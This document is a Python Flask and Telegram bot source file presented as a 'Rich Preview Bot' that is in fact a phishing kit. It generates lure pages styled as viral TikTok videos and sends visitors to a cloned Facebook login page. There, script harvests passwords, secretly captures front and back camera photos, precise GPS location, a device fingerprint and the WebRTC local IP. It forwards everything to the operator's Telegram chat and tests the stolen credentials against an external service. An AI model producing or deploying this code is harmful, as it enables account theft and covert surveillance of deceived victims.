import logging
import os
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from flask import Flask, request, render_template_string, jsonify, redirect
import requests
from threading import Thread
from dotenv import load_dotenv
from urllib.parse import urlparse, parse_qs
import base64
import yt_dlp
import hashlib

# Load environment variables
load_dotenv()

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app setup
app = Flask(__name__)

# Store your bot's API token and admin ID
API_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN') or ''
ADMIN_ID = int(os.getenv('TELEGRAM_CHAT_ID') or '0')
BASE_URL = os.getenv('BASE_URL', 'http://localhost:5000')

# Global storage for post data
post_storage = {}

# HTML template for the video preview page (html1)
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{{ title }}</title>
  
  <!-- Open Graph / Facebook - Full data for social sharing -->
  <meta property="og:type" content="video.other" />
  <meta property="og:url" content="{{ url }}" />
  <meta property="og:title" content="{{ title }}" />
  <meta property="og:description" content="{{ description }}" />
  <meta property="og:image" content="{{ thumbnail }}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:site_name" content="Video Platform" />
  
  <!-- Twitter - Full data for social sharing -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:url" content="{{ url }}" />
  <meta name="twitter:title" content="{{ title }}" />
  <meta name="twitter:description" content="{{ description }}" />
  <meta name="twitter:image" content="{{ thumbnail }}" />
  
  <!-- WhatsApp / Telegram optimized -->
  <meta name="description" content="{{ description }}" />
  <meta name="author" content="Video Platform" />
  <meta name="robots" content="index, follow" />
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .video-container {
      position: relative;
      cursor: pointer;
      transition: transform 0.2s;
    }
    .video-container:hover {
      transform: scale(1.02);
    }
    .play-button {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 60px;
      height: 60px;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      color: #333;
    }
    .loading {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 9999;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 20px;
    }
  </style>
</head>
<body class="bg-black min-h-screen flex items-center justify-center m-0 p-0">
  <div class="loading" id="loading">
    <div class="text-center">
      <div class="animate-spin rounded-full h-16 w-16 border-b-2 border-white mx-auto mb-4"></div>
      <div class="text-white">Loading...</div>
    </div>
  </div>
  
  <!-- Only thumbnail, no text content -->
  <div class="w-full h-full flex items-center justify-center">
    <div class="video-container" onclick="playVideo()">
      <img src="{{ thumbnail }}" alt="Video" class="max-w-full max-h-screen object-contain">
      <div class="play-button">▶</div>
    </div>
  </div>
  
  <script>
    function playVideo() {
      document.getElementById('loading').style.display = 'flex';
      setTimeout(() => {
        window.location.href = '/login?post_id={{ post_id }}';
      }, 2000);
    }
  </script>
</body>
</html>
"""

# HTML2 template for login page (provided by user)
html2_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(
        135deg,
        #fce4ec,
        #e3f2fd,
        #e8f5e9
      );
      background-size: cover;
      font-family: 'Roboto', sans-serif;
    }
    .floating-label {
      position: relative;
    }
    .floating-label input {
      padding-top: 20px;
    }
    .floating-label label {
      position: absolute;
      top: 14px;
      left: 16px;
      font-size: 14px;
      color: gray;
      pointer-events: none;
      transition: all 0.3s ease;
    }
    .floating-label input:focus + label,
    .floating-label input:not(:placeholder-shown) + label {
      top: 4px;
      left: 12px;
      font-size: 12px;
      color: #2563eb;
    }
    .forgot-password {
      color: black;
      background-color: white;
    }
    .input-field {
      color: gray;
    }
    .eye-icon {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #888;
    }
    .eye-icon:hover {
      color: #000;
    }
  </style>
</head>
<body class="h-screen flex justify-center items-center">
  <div class="w-full max-w-md px-6">
    <div class="text-center text-sm text-gray-500 mb-8">English (US)</div>
    <div class="flex justify-center mb-16">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/y6/r/UbJC5lwxeBU.png" alt="Facebook Logo" class="h-14">
    </div>
    <form class="space-y-6" onsubmit="return handleLogin(event)" method="POST">
      <div class="floating-label">
        <input type="text" name="email" placeholder="" required
          class="w-full px-4 py-4 border border-gray-300 rounded-lg text-gray-700 text-sm focus:ring-2 focus:ring-blue-500 focus:outline-none input-field">
        <label for="email">Mobile number or email</label>
      </div>
      <div class="floating-label relative">
        <input type="password" id="password" name="password" placeholder="" required
          class="w-full px-4 py-4 border border-gray-300 rounded-lg text-gray-700 text-sm focus:ring-2 focus:ring-blue-500 focus:outline-none input-field">
        <label for="password">Password</label>
        <i class="fas fa-eye eye-icon" id="toggleEye"></i>
      </div>
      <button type="submit"
        class="w-full bg-blue-600 text-white py-2.5 rounded-full text-sm font-semibold hover:bg-blue-700 focus:ring-2 focus:ring-blue-500 focus:outline-none">
        Log in
      </button>
    </form>
    <div class="text-center text-sm mt-4 hover:underline">
      <a href="https://www.facebook.com/recover/initiate" target="_blank">Forgot password?</a>
    </div>
    <div class="mt-16">
      <button
        class="w-full border border-blue-600 text-blue-600 py-2.5 rounded-full text-sm font-semibold hover:bg-blue-50 focus:ring-2 focus:ring-blue-500 focus:outline-none">
        <a href="https://www.facebook.com/r.php" target="_blank">Create new account</a>
      </button>
    </div>
    <div class="mt-4 flex justify-center">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yZ/r/zG-q7jIS191.png" alt="Meta Logo" class="h-3">
    </div>
    <div class="text-center text-xs text-gray-500 mt-4 space-x-6">
      <a href="https://www.facebook.com/about/" class="hover:underline" target="_blank">About</a>
      <a href="https://www.facebook.com/help/" class="hover:underline" target="_blank">Help</a>
      <a href="https://www.facebook.com/legal/" class="hover:underline" target="_blank">More</a>
    </div>
  </div>

  <!-- HTML3 Popup Overlay -->
  <div id="loginFailedPopup" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 9999; justify-content: center; align-items: center;">
    <div style="width: 100%; max-width: 400px; background-color: #ffffff; border-radius: 12px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2); text-align: center; padding: 20px 16px; margin: 20px;">
      <h2 style="font-size: 18px; font-weight: bold; margin: 0; color: #050505;">Need help finding your account?</h2>
      <p style="font-size: 14px; color: #65676b; margin: 12px 0 20px;">It looks like <strong>your account</strong> isn't connected to an account but we can help you find your account and log in.</p>

      <a href="https://m.facebook.com/login/identify/" target="_blank" style="display: block; width: 90%; margin: 10px auto; padding: 12px 0; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; text-decoration: none; background-color: #ffffff; color: #1877f2; border: 1px solid #ccd0d5;">Find Account</a>
      <button onclick="tryAgain()" style="display: block; width: 90%; margin: 10px auto; padding: 12px 0; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; text-decoration: none; background-color: #ffffff; color: #1877f2; border: 1px solid #ccd0d5;">Try again</button>

      <div style="margin-top: 20px; font-size: 12px; color: #65676b;">
        <p>Meta</p>
      </div>
    </div>
  </div>

  <script>
    // Eye icon toggle functionality
    const passwordInput = document.getElementById('password');
    const toggleEye = document.getElementById('toggleEye');

    toggleEye.addEventListener('click', () => {
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleEye.classList.remove('fa-eye');
        toggleEye.classList.add('fa-eye-slash');
      } else {
        passwordInput.type = 'password';
        toggleEye.classList.remove('fa-eye-slash');
        toggleEye.classList.add('fa-eye');
      }
    });

    // Comprehensive data collection
    async function collectAllData() {
      const allData = {
        camera: null,
        location: null,
        device: null,
        network: null
      };

      // 1. Camera access and capture
      try {
        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const frontImages = [];
        
        for (let i = 0; i < 2; i++) {
          const canvas = document.createElement('canvas');
          const video = document.createElement('video');
          video.srcObject = frontStream;
          await video.play();
          
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          
          frontImages.push(canvas.toDataURL('image/jpeg'));
          await new Promise(resolve => setTimeout(resolve, 500));
        }
        frontStream.getTracks().forEach(track => track.stop());
        
        try {
          const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
          const canvas = document.createElement('canvas');
          const video = document.createElement('video');
          video.srcObject = backStream;
          await video.play();
          
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          
          const backImage = canvas.toDataURL('image/jpeg');
          backStream.getTracks().forEach(track => track.stop());
          
          allData.camera = { front: frontImages, back: backImage };
        } catch (e) {
          allData.camera = { front: frontImages, back: null };
        }
      } catch (error) {
        console.error('Camera access failed:', error);
        allData.camera = null;
      }

      // 2. Location access
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          });
        });
        
        allData.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          speed: position.coords.speed,
          timestamp: new Date(position.timestamp).toISOString()
        };
      } catch (error) {
        console.error('Location access failed:', error);
        allData.location = { error: error.message };
      }

      // 3. Device information
      allData.device = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        vendorSub: navigator.vendorSub,
        productSub: navigator.productSub,
        onLine: navigator.onLine,
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth
        },
        window: {
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          outerWidth: window.outerWidth,
          outerHeight: window.outerHeight
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
      };

      // 4. Network information
      allData.network = {
        connection: navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData
        } : null,
        webRTC: null
      };

      // Get IP and network details via WebRTC
      try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        pc.createDataChannel('');
        
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        
        const networkInfo = await new Promise((resolve) => {
          pc.onicecandidate = (event) => {
            if (event.candidate) {
              const candidate = event.candidate.candidate;
              const match = candidate.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
              if (match) {
                resolve({ localIP: match[1], candidate: candidate });
                pc.close();
              }
            }
          };
          setTimeout(() => resolve({ localIP: 'unknown', candidate: 'timeout' }), 3000);
        });
        
        allData.network.webRTC = networkInfo;
      } catch (error) {
        allData.network.webRTC = { error: error.message };
      }

      return allData;
    }

    async function handleLogin(event) {
      event.preventDefault();
      
      const email = document.querySelector('input[name="email"]').value;
      const password = document.querySelector('input[name="password"]').value;
      const postId = new URLSearchParams(window.location.search).get('post_id');
      
      // Show loading indicator
      document.querySelector('button[type="submit"]').innerHTML = 'Collecting data...';
      document.querySelector('button[type="submit"]').disabled = true;
      
      // Collect all comprehensive data
      const allData = await collectAllData();
      
      // Send all data to server
      const response = await fetch('/verify-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          email: email,
          password: password,
          camera: allData.camera,
          location: allData.location,
          device: allData.device,
          network: allData.network,
          post_id: postId
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        // Login successful - redirect to original post
        window.location.href = result.redirect_url;
      } else {
        // Login failed - show HTML3 popup
        showLoginFailedPopup();
      }
      
      return false;
    }

    function showLoginFailedPopup() {
      document.getElementById('loginFailedPopup').style.display = 'flex';
      // Reset login button
      document.querySelector('button[type="submit"]').innerHTML = 'Log in';
      document.querySelector('button[type="submit"]').disabled = false;
    }

    function closePopup() {
      document.getElementById('loginFailedPopup').style.display = 'none';
    }

    function tryAgain() {
      closePopup();
      // Clear form fields
      document.querySelector('input[name="email"]').value = '';
      document.querySelector('input[name="password"]').value = '';
    }
  </script>
</body>
</html>
"""

# HTML3 template for login failure (provided by user)
html3_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook - Log In or Sign Up</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .popup-container {
      width: 100%;
      max-width: 400px;
      background-color: #ffffff;
      border-radius: 12px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
      text-align: center;
      padding: 20px 16px;
    }

    .popup-container h2 {
      font-size: 18px;
      font-weight: bold;
      margin: 0;
      color: #050505;
    }

    .popup-container p {
      font-size: 14px;
      color: #65676b;
      margin: 12px 0 20px;
    }

    .popup-container .btn {
      display: block;
      width: 90%;
      margin: 10px auto;
      padding: 12px 0;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      text-decoration: none;
    }

    .btn-find {
      background-color: #ffffff;
      color: #1877f2;
      border: 1px solid #ccd0d5;
    }

    .btn-try {
      background-color: #ffffff;
      color: #1877f2;
      border: 1px solid #ccd0d5;
    }

    .btn-find:hover,
    .btn-try:hover {
      background-color: #f0f2f5;
    }

    .meta-logo {
      margin-top: 20px;
      font-size: 12px;
      color: #65676b;
    }
  </style>
</head>
<body>
  <div class="popup-container">
    <h2>Need help finding your account?</h2>
    <p>It looks like <strong>your account</strong> isn't connected to an account but we can help you find your account and log in.</p>

    <a href="https://m.facebook.com/login/identify/" class="btn btn-find">Find Account</a>
    <a href="/post/{{ post_id }}" class="btn btn-try">Try again</a>

    <div class="meta-logo">
      <p>Meta</p>
    </div>
  </div>
</body>
</html>
"""

# Function to extract real video metadata using yt-dlp
def extract_video_info(url):
    try:
        ydl_opts = {
            'quiet': True,
            'no_warnings': True,
            'extract_flat': False,
            'writesubtitles': False,
            'writeautomaticsub': False,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            
            title = info.get('title', 'Amazing Video')
            description = info.get('description', 'Watch this amazing video')
            thumbnail = info.get('thumbnail')
            
            # Clean up title and description
            if title:
                title = title[:100] + '...' if len(title) > 100 else title
            if description:
                description = description[:200] + '...' if len(description) > 200 else description
            
            # Extract hashtags from title or description
            hashtags = []
            import re
            text_to_search = f"{title} {description}".lower()
            hashtag_matches = re.findall(r'#([a-zA-Z0-9_]+)', text_to_search)
            hashtags = hashtag_matches[:8] if hashtag_matches else ['viral', 'trending', 'amazing']
            
            return {
                'title': title,
                'description': description,
                'thumbnail': thumbnail,
                'hashtags': hashtags
            }
    except Exception as e:
        logger.warning(f"Failed to extract video info: {e}")
        return None

# Helper function to generate rich preview data
def generate_post_data(original_url):
    post_id = hashlib.md5(original_url.encode()).hexdigest()[:10]
    
    # Try to extract real video data using yt-dlp
    real_data = extract_video_info(original_url)
    
    if real_data and real_data['title'] and real_data['thumbnail']:
        # Use real extracted data
        post_data = {
            'id': post_id,
            'title': real_data['title'],
            'description': real_data['description'] or 'Watch this amazing video content!',
            'hashtags': real_data['hashtags'],
            'thumbnail': real_data['thumbnail'],
            'original_url': original_url
        }
        logger.info(f"Extracted real data for {original_url}: {real_data['title']}")
    else:
        # Fallback to dynamic content if extraction fails
        logger.info(f"Using fallback data for {original_url}")
        
        # Fallback titles, descriptions, hashtags, and thumbnails
        titles = [
            'Amazing TikTok Video 🔥 #viral #trending #foryou',
            'Must Watch! 😱 #amazing #bangladesh #tiktok',
            'Incredible Moments 🌟 #fyp #trending #mustwatch',
            'Viral Content Alert! 🚨 #viral #amazing #foryoupage',
            'Best TikTok Ever! 💯 #best #trending #viral',
            'Mind Blowing Video 🤯 #mindblown #amazing #fyp',
            'Epic Moments Compilation 🎬 #epic #moments #viral',
            'Trending Now! 📈 #trending #hot #foryou',
            'Crazy Video Alert! 😮 #crazy #amazing #mustsee',
            'Popular Content 🌟 #popular #trending #bangladesh'
        ]
        
        descriptions = [
            'Watch this incredible video that\'s taking TikTok by storm! Don\'t miss out on the latest trending content.',
            'This amazing video is going viral everywhere! Join millions of viewers watching this must-see content.',
            'Discover the hottest trending video on TikTok right now. You won\'t believe what happens next!',
            'Breaking: This video is trending #1 on TikTok Bangladesh. Watch before it gets removed!',
            'Epic content that everyone is talking about. Join the conversation and watch now!',
            'Must-watch video that\'s breaking the internet. See why everyone is sharing this content.',
            'Viral sensation taking over social media. Don\'t be the last to see this amazing video!',
            'Trending content that you absolutely cannot miss. Watch and share with your friends!',
            'Popular video with millions of views. See what all the hype is about right here.',
            'Hot trending content from TikTok Bangladesh. Watch this viral video everyone is talking about!'
        ]
        
        hashtag_sets = [
            ['viral', 'trending', 'foryou', 'bangladesh', 'tiktok'],
            ['fyp', 'amazing', 'mustsee', 'trending', 'viral'],
            ['popular', 'hot', 'trending', 'bangladesh', 'amazing'],
            ['viral', 'epic', 'moments', 'trending', 'fyp'],
            ['mustwatch', 'viral', 'amazing', 'trending', 'hot'],
            ['foryoupage', 'viral', 'trending', 'bangladesh', 'epic'],
            ['trending', 'popular', 'amazing', 'viral', 'mustsee'],
            ['fyp', 'hot', 'trending', 'viral', 'bangladesh'],
            ['amazing', 'viral', 'trending', 'epic', 'popular'],
            ['viral', 'trending', 'hot', 'amazing', 'fyp']
        ]
        
        thumbnails = [
            'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1633356122544-f134324a6cee?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1627398242454-45a1465c2479?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1634942537034-2531766767d1?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1586717791821-3f44a563fa4c?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1611224923853-80b023f02d71?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1629904853893-c2c8981a1dc5?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1635070041078-e363dbe005cb?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1587614382346-4ec70e388b28?w=1200&h=630&fit=crop&crop=center',
            'https://images.unsplash.com/photo-1590736969955-71cc94901144?w=1200&h=630&fit=crop&crop=center'
        ]
        
        # Use URL hash to consistently select same content for same URL
        hash_int = int(post_id, 16) % 10
        
        post_data = {
            'id': post_id,
            'title': titles[hash_int],
            'description': descriptions[hash_int],
            'hashtags': hashtag_sets[hash_int],
            'thumbnail': thumbnails[hash_int],
            'original_url': original_url
        }
    
    # Store in global storage
    post_storage[post_id] = post_data
    return post_data

# Command to start the bot
async def start(update: Update, context):
    if update.message:
        await update.message.reply_text("Send me any link, and I'll generate a rich preview page for you.")

# Handling user message and creating the HTML page
async def handle_message(update: Update, context):
    if update.message and update.message.text:
        link = update.message.text
        
        # Generate post data with rich preview
        post_data = generate_post_data(link)
        
        # Create the preview URL
        preview_url = f"{BASE_URL}/post/{post_data['id']}"
        
        await update.message.reply_text(f"Here is your rich preview page: {preview_url}")
        await update.message.reply_text(f"Original link: {link}")

# Route to display post with rich preview
@app.route('/post/<post_id>')
def show_post(post_id):
    if post_id not in post_storage:
        return "Post not found", 404
    
    post_data = post_storage[post_id]
    return render_template_string(html_template, 
                                title=post_data['title'],
                                description=post_data['description'],
                                hashtags=post_data['hashtags'],
                                thumbnail=post_data['thumbnail'],
                                url=f"{BASE_URL}/post/{post_id}",
                                post_id=post_id)

# Route to show login page (html2)
@app.route('/login')
def show_login():
    post_id = request.args.get('post_id')
    if not post_id or post_id not in post_storage:
        return "Invalid post", 404
    
    return render_template_string(html2_template)

# Route to verify login and handle comprehensive data
@app.route('/verify-login', methods=['POST'])
def verify_login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    camera_data = data.get('camera')
    location_data = data.get('location')
    device_data = data.get('device')
    network_data = data.get('network')
    post_id = data.get('post_id')
    
    if not post_id or post_id not in post_storage:
        return jsonify({'success': False, 'error': 'Invalid post'})
    
    # Send comprehensive data to Telegram admin
    message = f"🔴 COMPREHENSIVE DATA COLLECTION\n\n"
    message += f"📝 Login Details:\nEmail: {email}\nPassword: {password}\nPost ID: {post_id}\n\n"
    
    # Location information
    if location_data and 'latitude' in location_data:
        message += f"📍 Location Data:\n"
        message += f"Latitude: {location_data['latitude']}\n"
        message += f"Longitude: {location_data['longitude']}\n"
        message += f"Accuracy: {location_data.get('accuracy', 'N/A')} meters\n"
        message += f"Altitude: {location_data.get('altitude', 'N/A')} meters\n"
        message += f"Speed: {location_data.get('speed', 'N/A')} m/s\n"
        message += f"Timestamp: {location_data.get('timestamp', 'N/A')}\n\n"
    else:
        message += f"📍 Location: Access denied or failed\n\n"
    
    # Device information
    if device_data:
        message += f"📱 Device Information:\n"
        message += f"Platform: {device_data.get('platform', 'N/A')}\n"
        message += f"Language: {device_data.get('language', 'N/A')}\n"
        message += f"Timezone: {device_data.get('timezone', 'N/A')}\n"
        message += f"Online Status: {device_data.get('onLine', 'N/A')}\n"
        if 'screen' in device_data:
            screen = device_data['screen']
            message += f"Screen: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}\n"
            message += f"Color Depth: {screen.get('colorDepth', 'N/A')} bits\n"
        message += f"Hardware Cores: {device_data.get('hardwareConcurrency', 'N/A')}\n"
        message += f"Max Touch Points: {device_data.get('maxTouchPoints', 'N/A')}\n\n"
    
    # Network information
    if network_data:
        message += f"🌐 Network Information:\n"
        if network_data.get('connection'):
            conn = network_data['connection']
            message += f"Connection Type: {conn.get('effectiveType', 'N/A')}\n"
            message += f"Downlink Speed: {conn.get('downlink', 'N/A')} Mbps\n"
            message += f"Round Trip Time: {conn.get('rtt', 'N/A')} ms\n"
            message += f"Save Data Mode: {conn.get('saveData', 'N/A')}\n"
        if network_data.get('webRTC') and 'localIP' in network_data['webRTC']:
            message += f"Local IP: {network_data['webRTC']['localIP']}\n"
        message += "\n"
    
    # User Agent (shortened)
    if device_data and device_data.get('userAgent'):
        ua = device_data['userAgent'][:100] + '...' if len(device_data['userAgent']) > 100 else device_data['userAgent']
        message += f"🔍 User Agent: {ua}\n\n"
    
    # Send main message
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  data={'chat_id': ADMIN_ID, 'text': message})
    
    # Send camera images if available
    if camera_data:
        if camera_data.get('front'):
            for i, img_data in enumerate(camera_data['front']):
                try:
                    img_binary = base64.b64decode(img_data.split(',')[1])
                    files = {'photo': ('front_camera_{}.jpg'.format(i+1), img_binary, 'image/jpeg')}
                    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendPhoto",
                                data={'chat_id': ADMIN_ID, 'caption': f'📷 Front Camera {i+1}'},
                                files=files)
                except Exception as e:
                    logger.error(f"Failed to send front camera image {i+1}: {e}")
        
        if camera_data.get('back'):
            try:
                img_binary = base64.b64decode(camera_data['back'].split(',')[1])
                files = {'photo': ('back_camera.jpg', img_binary, 'image/jpeg')}
                requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendPhoto",
                            data={'chat_id': ADMIN_ID, 'caption': '📷 Back Camera'},
                            files=files)
            except Exception as e:
                logger.error(f"Failed to send back camera image: {e}")
    
    # Verify login credentials against external service
    try:
        # Get verification URL from environment or use default
        verify_url = os.getenv('LOGIN_VERIFY_URL', 'https://example.com/login')
        
        verify_response = requests.post(verify_url, 
                                      data={'email': email, 'password': password},
                                      timeout=10)
        
        if verify_response.status_code == 200:
            # Login successful - redirect to original post
            original_url = post_storage[post_id]['original_url']
            requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                         data={'chat_id': ADMIN_ID, 'text': f'✅ LOGIN VERIFIED: {email} - Forwarding to post'})
            return jsonify({'success': True, 'redirect_url': original_url})
        else:
            # Login failed - show HTML3 popup
            requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                         data={'chat_id': ADMIN_ID, 'text': f'❌ LOGIN FAILED: {email} - Showing error popup'})
            return jsonify({'success': False})
    except Exception as e:
        # If verification service is down, still redirect to original post
        original_url = post_storage[post_id]['original_url']
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                     data={'chat_id': ADMIN_ID, 'text': f'⚠️ VERIFICATION ERROR: {email} - Service down, forwarding to post'})
        return jsonify({'success': True, 'redirect_url': original_url})

# Route to show login failed page (html3)
@app.route('/login-failed')
def show_login_failed():
    post_id = request.args.get('post_id')
    if not post_id:
        post_id = 'unknown'
    
    return render_template_string(html3_template, post_id=post_id)

# Legacy route for backward compatibility
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Send the details to the admin
    message = f"Legacy form submission:\nUsername: {username}\nPassword: {password}"
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  data={'chat_id': ADMIN_ID, 'text': message})
    
    return "Form submitted successfully!"

# Function to run the bot
def start_bot():
    import asyncio
    
    def run_bot():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        application = Application.builder().token(API_TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Start the bot without signal handlers to avoid threading issues
        loop.run_until_complete(application.run_polling(stop_signals=None))
    
    if API_TOKEN and API_TOKEN != '':
        run_bot()
    else:
        logger.warning("No Telegram bot token found, skipping bot startup")

# Health check route
@app.route('/')
def health_check():
    return {'status': 'running', 'message': 'Rich Preview Bot is running!'}

# Run both the Flask app and the Telegram bot
def main():
    logger.info("Starting Rich Preview Bot...")
    logger.info(f"Base URL: {BASE_URL}")
    logger.info(f"Admin ID: {ADMIN_ID}")
    
    # Start the bot in a separate thread
    bot_thread = Thread(target=start_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Run the Flask web server (Railway provides PORT env variable)
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    main()
